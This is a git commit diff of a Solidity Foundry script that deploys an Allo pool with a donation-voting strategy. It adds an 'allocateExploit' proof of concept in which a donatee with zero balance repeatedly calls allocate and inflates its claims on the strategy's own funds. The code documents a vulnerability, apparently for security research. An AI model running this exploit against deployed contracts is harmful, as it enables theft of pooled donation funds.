6c485c1c42e2d209c76628e524ca32f036f938ff
Maddiaa0 <47148561+Maddiaa0@users.noreply.github.com>
2023-11-22 12:11:30 +0000

    chore: add deploy helpers + allo scripts

--- portal/script/DeployBridges.s.sol
+++ portal/script/DeployBridges.s.sol
@@ -1,41 +1,63 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.18;
 
-import {Script, console2} from "forge-std/Script.sol";
+import "forge-std/Test.sol";
 
+import {DonationVotingStrategy} from
+  "@allo/contracts/strategies/_poc/donation-voting/DonationVotingStrategy.sol";
+import {Allo} from "@allo/contracts/core/Allo.sol";
+import {Registry} from "@allo/contracts/core/Registry.sol";
 
-import {TokenPortal} from "src/bridge/TokenPortal.sol";
-import {HawthoriaPortal } from "src/HawPortal.sol";
-// import {ERC20} from "@oz/tokens/ERC20/ERC20.sol";
+import {PortalERC20} from "../src/bridge/PortalERC20.sol";
+import {GitcoinDeployHelper} from "./GitcoinDeployHelper.sol";
 
+contract GitcoinDeployment is Test {
+  // Anvil Test-account 9: 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6
+  address constant MANAGER = address(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720);
 
-contract DeployBridges is Script {
-    
-    // Allo is already deployed on testnets which HELPS ME GREATLY
-    address constant ALLO = 0x79536CC062EE8FAFA7A19a5fa07783BD7F792206;
+  Allo public ALLO;
+  DonationVotingStrategy public strategy;
+  uint256 public poolId;
+  PortalERC20 public token;
 
-    address constant AZTEC_REGISTRY = 0x79536CC062EE8FAFA7A19a5fa07783BD7F792206;
-    bytes32 constant L2_TOKEN_ADDRESS = hex"";
-
-
-    function setUp() public {}
-
-    function deploy() public returns (TokenPortal tokenPortal, HawthoriaPortal hawthoriaPortal) {
-        vm.broadcast();
-
-        // Token to use
-        // address erc20 = new ERC20("our_token", "token");
-
-        // Deploy the aztec token bridges
-        // toknPortal = new TokenPortal();
-
-
-
+  function deploy(bool _broadcast) public returns (GitcoinDeployHelper) {
+    if (_broadcast) {
+      vm.broadcast();
     }
+    GitcoinDeployHelper helper = new GitcoinDeployHelper(MANAGER);
 
-    // function initialise() {
-    //     // Initialise the token contract once we have the chain deployed
-    //     tokenPortal.initialize(AZTEC_REGISTRY, erc20, L2_TOKEN_ADDRESS);
+    poolId = helper.poolId();
+    strategy = helper.strategy();
+    ALLO = helper.allo();
+    token = helper.token();
 
-    // }
+    emit log_named_address("Allo    ", address(ALLO));
+    emit log_named_address("Strategy", address(strategy));
+    emit log_named_address("Token   ", address(token));
+    emit log_named_uint("Pool id ", poolId);
+    emit log_named_address("Donatee ", address(helper));
+
+    return helper;
+  }
+
+  function allocateExploit() public {
+    // Minting 2e18 token into the strategy. notice the donatee have NO balance to allocate in the tx.
+    // The allocation will make the strategy transfer its own funds to itself, while adding the claim
+    // to the donatee.
+
+    GitcoinDeployHelper helper = deploy(false);
+    address donatee = address(helper);
+
+    assertEq(token.balanceOf(donatee), 0);
+    assertEq(strategy.claims(donatee, address(token)), 0);
+
+    for (uint256 i = 0; i < 5; i++) {
+      emit log("allocating 2e18 tokens to himself");
+      assertEq(token.balanceOf(donatee), 0);
+
+      vm.prank(donatee);
+      ALLO.allocate(poolId, abi.encode(donatee, 2e18, address(token)));
+      assertEq(strategy.claims(donatee, address(token)), 2e18 * (i + 1));
+      emit log_named_decimal_uint("Claim Value", strategy.claims(donatee, address(token)), 18);
+    }
+  }
 }
